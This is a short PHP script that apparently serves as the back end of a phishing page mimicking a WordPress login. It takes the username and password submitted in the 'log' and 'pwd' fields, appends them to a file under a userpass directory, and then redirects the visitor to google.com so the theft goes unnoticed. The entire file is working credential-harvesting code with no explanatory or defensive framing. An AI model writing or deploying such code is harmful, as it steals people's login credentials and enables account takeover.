<?php

file_put_contents("../userpass/usernames.txt", "Wordpress Username: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
?>